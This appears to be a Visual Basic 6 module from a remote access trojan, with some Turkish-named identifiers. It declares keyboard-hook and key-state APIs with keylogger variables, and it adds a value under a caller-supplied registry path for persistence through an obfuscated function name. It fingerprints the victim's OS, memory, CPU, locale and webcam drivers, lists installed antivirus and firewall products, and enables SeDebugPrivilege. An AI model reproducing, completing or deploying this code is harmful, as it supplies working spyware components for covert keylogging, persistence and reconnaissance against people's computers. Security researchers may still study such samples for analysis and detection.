Attribute VB_Name = "mdlFunction"
Public Declare Function IsNTAdmin Lib "advpack" (ByVal dwReserved As Long, ByRef lpdwReserved As Long) As Long
Public Declare Function SetWindowsHookExA Lib "user32" (ByVal idHook As Long, ByVal lpfn As Long, ByVal hMod As Long, ByVal dwThreadID As Long) As Long
Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (lpVersionInformation As OSVERSIONINFO) As Long
Private Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Long, ByVal ncode As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function GetVersionExA Lib "kernel32" (lpVersionInformation As OSVERSIONINFO) As Long
Private Declare Function GetLocaleInfoA Lib "kernel32" (ByVal Locale As Long, ByVal LCType As Long, ByVal lpLCData As String, ByVal cchData As Long) As Long
Private Declare Sub GlobalMemoryStatus Lib "kernel32" (lpBuffer As MEMORYSTATUS)
Private Declare Sub GetSystemInfo Lib "kernel32" (lpSystemInfo As SYSTEM_INFO)
Private Declare Function capGetDriverDescriptionA Lib "avicap32" (ByVal wDriver As Integer, ByVal lpszName As String, ByVal cbName As Long, ByVal lpszVer As String, ByVal cbVer As Long) As Boolean
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowTextA Lib "user32" (ByVal hWND As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLengthA Lib "user32" (ByVal hWND As Long) As Long
Private Declare Function GetKeyboardLayoutNameA Lib "user32" (ByVal pwszKLID As String) As Long
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Sub RtlMoveMemory Lib "kernel32" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)

Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
Private Declare Function OpenProcessToken Lib "advapi32" (ByVal ProcessHandle As Long, ByVal DesiredAccess As Long, TokenHandle As Long) As Long
Private Declare Function LookupPrivilegeValueA Lib "advapi32" (ByVal lpSystemName As String, ByVal lpName As String, lpLuid As LUID) As Long
Private Declare Function AdjustTokenPrivileges Lib "advapi32" (ByVal TokenHandle As Long, ByVal DisableAllPrivileges As Long, NewState As TOKEN_PRIVILEGES, ByVal BufferLength As Long, PreviousState As TOKEN_PRIVILEGES, ReturnLength As Long) As Long

Dim sCurrentWindow As String

Private Type SYSTEM_INFO
        dwOemID As Long
        dwPageSize As Long
        lpMinimumApplicationAddress As Long
        lpMaximumApplicationAddress As Long
        dwActiveProcessorMask As Long
        dwNumberOrfProcessors As Long
        dwProcessorType As Long
        dwAllocationGranularity As Long
        dwReserved As Long
End Type

Private Type OSVERSIONINFO
    OSVersionInfoSize As Long
    MajorVersion As Long
    MinorVersion As Long
    BuildNumber As Long
    PlatformId As Long
    szCSDVersion As String * 128
End Type
Private Type OSVERSIONINFOEX
    dwOSVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
    wServicePackMajor As Integer
    wServicePackMinor As Integer
    wSuiteMask As Integer
    wProductType As Byte
    wReserved As Byte
End Type

Private Type MEMORYSTATUS
  dwLength As Long
  dwMemoryLoad As Long
  dwTotalPhys As Long
  dwAvailPhys As Long
  dwTotalPageFile As Long
  dwAvailPageFile As Long
  dwTotalVirtual As Long
  dwAvailVirtual As Long
End Type

Private Type KBDLLHOOKSTRUCT
    vkCode As Long
    scanCode As Long
    flags As Long
    time As Long
    dwExtraInfo As Long
End Type

Private Type LUID
    LowPart As Long
    HighPart As Long
End Type

 Private Type LUID_AND_ATTRIBUTES
    pLuid As LUID
    Attributes As Long
End Type

Type TOKEN_PRIVILEGES
    PrivilegeCount As Long
    Privileges(1) As LUID_AND_ATTRIBUTES
End Type

Public KeyBoardHook As Long
Public sKeylog As String
Public iKeylog As Integer
Public bKeylog As Boolean
Public Fso As Object
Public Reg As Object

Public Function B45L4NG1C4_3KL3(Value As String, Optional FileName As String, Optional kayityeriyolumuz As String) As Boolean
    Dim hKey As Long, hCreate As Long, hSet As Long
    If IsUserAnAdmin() = 1 Then
        hCreate = RegCreateKey(GetRootValue("HKEY_CURRENT_USER"), kayityeriyolumuz, hKey)
    Else
        hCreate = RegCreateKey(GetRootValue("HKEY_CURRENT_USER"), kayityeriyolumuz, hKey)
    End If
    If hCreate = 0 Then
        hSet = RegSetValueEx(hKey, Value, 0, mdlapiler.REG_SZ, ByVal FileName, Len(FileName))
        If hSet = 0 Then
            B45L4NG1C4_3KL3 = True
        End If
    End If
    mdlapiler.RegCloseKey (hKey)
End Function

Public Function getWindowsVersion() As String
    Dim OS As OSVERSIONINFO
    Dim blnStatus As Boolean
    Dim strVersion As String
    OS.OSVersionInfoSize = Len(OS)
    blnStatus = GetVersionEx(OS)

strVersion = OS.PlatformId & "." & OS.MajorVersion & "." & OS.MinorVersion

If strVersion = "1.4.0" Then
        getWindowsVersion = "Win 95"
    ElseIf strVersion = "1.4.10" Then
        getWindowsVersion = "Win 98"
    ElseIf strVersion = "1.4.98" Then
        getWindowsVersion = "Win ME"
    ElseIf strVersion = "2.3.51" Then
        getWindowsVersion = "Win NT 3"
    ElseIf strVersion = "2.4.0" Then
        getWindowsVersion = "Win NT 4"
    ElseIf strVersion = "2.5.0" Then
        getWindowsVersion = "Win 2000"
    ElseIf strVersion = "2.5.1" Then
        getWindowsVersion = "Win XP"
    ElseIf strVersion = "2.6.0" Then
        getWindowsVersion = "Win Vista"
    Else
        Getosver = "Unknown"
    End If
    End Function

Public Function MemoryAvailable() As String
  Dim MemStat As MEMORYSTATUS
  MemStat.dwLength = Len(MemStat)
  GlobalMemoryStatus MemStat
  MemoryAvailable = MemStat.dwTotalPhys & "|" & MemStat.dwAvailPhys
End Function

Public Function GetCPUSpeedMHz() As Long
  Dim Temp As Long
  Dim Reg As Object
  Set Reg = CreateObject("WScript.Shell")
  Temp = CLng(Reg.regread("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0\~MHz"))
  Set Reg = Nothing
  GetCPUSpeedMHz = Temp
End Function

Public Function CountryTag() As String
    Dim buffer As String * 100
    Dim dl&
    dl& = GetLocaleInfoA(0, &H1002, buffer, 99)
    CountryTag = ((LPSTRToVBString(buffer)))
End Function
Public Function GetCountryCode() As String
Dim sBuffer As String * 10
GetLocaleInfoA &H400, 90, sBuffer, 10
GetCountryCode = LPSTRToVBString(sBuffer)
End Function

Public Function LPSTRToVBString(ByVal sText As String)
   Dim nullpos&
   nullpos& = InStr(sText, Chr$(0))
   If nullpos > 0 Then
   LPSTRToVBString = Left$(sText, nullpos - 1)
   Else
   LPSTRToVBString = ""
   End If
End Function

Public Function GetFWAV() As String
    On Error Resume Next
    Dim colItems As Object
    Dim objItem As Object
    Dim objWMIService As Object
    Set objWMIService = GetObject("winmgmts:\\.\root\SecurityCenter")
    
    Set colItems = objWMIService.ExecQuery("Select * from FirewallProduct")
    
    Dim tmp As String, endt As String
    tmp = "-"
    For Each objItem In colItems
        tmp = objItem.CompanyName & " " & objItem.DisplayName & " (" & objItem.versionnumber & ")"
    Next
    endt = tmp
    tmp = "-"
    Set colItems = objWMIService.ExecQuery("Select * from AntiVirusProduct")

    For Each objItem In colItems
       tmp = objItem.CompanyName & " " & objItem.DisplayName & " (" & objItem.versionnumber & ")"
    Next
    GetFWAV = endt & "|" & tmp
End Function

Public Function GetProcessor() As String
Dim SYSINFO As SYSTEM_INFO
Call GetSystemInfo(SYSINFO)
Select Case (SYSINFO.dwProcessorType)
    Case 21064: GetProcessor = "DEC Alpha 21064"
    Case 386:   GetProcessor = "Intel 386"
    Case 486:   GetProcessor = "Intel 486"
    Case 586:   GetProcessor = "Intel Pentium"
    Case 4000:  GetProcessor = "MIPS R4000"
    Case Else:  GetProcessor = "Unknown"
End Select
End Function

Public Function GetCPUModel() As String
  Dim Reg As Object
  Set Reg = CreateObject("WScript.Shell")
  GetCPUModel = Reg.regread("HKEY_LOCAL_MACHINE\Hardware\Description\System\CentralProcessor\0\Identifier")
End Function

Function GetCamDrvs() As String
On Error GoTo ErrDrvs
Dim lResult As Long
Dim DrvName As String * 255
Dim DrvVer As String * 255
lResult = capGetDriverDescriptionA(0, DrvName, 100, DrvVer, 100)
GetCamDrvs = "No Drivers"
If lResult Then GetCamDrvs = LPSTRToVBString(DrvName) & " " & LPSTRToVBString(DrvVer)
Exit Function
ErrDrvs:
GetCamDrvs = "No Drivers"
End Function

Public Function SePrivileges() As Long
    Dim hProc As Long
    Dim hToken As Long
    Dim lResult As Long
    Dim mLUID As LUID
    Dim mPriv As TOKEN_PRIVILEGES
    Dim mNewPriv As TOKEN_PRIVILEGES
    'Dim sPrivilages(4) As String

    'sPrivilages(0) = "SeSystemtimePrivilege"
    'sPrivilages(1) = "SeDebugPrivilege"
    'sPrivilages(2) = "SebackupPrivilege"
    'sPrivilages(3) = "SeSecurityPrivilege"
    'sPrivilages(4) = "SeShutdownPrivilege"

    hProc = GetCurrentProcess()
    OpenProcessToken hProc, &H20 + &H8, hToken

    'For i = 0 To 4
        LookupPrivilegeValueA vbNullString, "SeDebugPrivilege", mLUID '  sPrivilages(i), mLUID
        mPriv.PrivilegeCount = 1
        mPriv.Privileges(0).Attributes = &H2
        mPriv.Privileges(0).pLuid = mLUID
        SePrivileges = AdjustTokenPrivileges(hToken, False, mPriv, 4 + (12 * mPriv.PrivilegeCount), mNewPriv, 4 + (12 * mNewPriv.PrivilegeCount))
    'Next
End Function
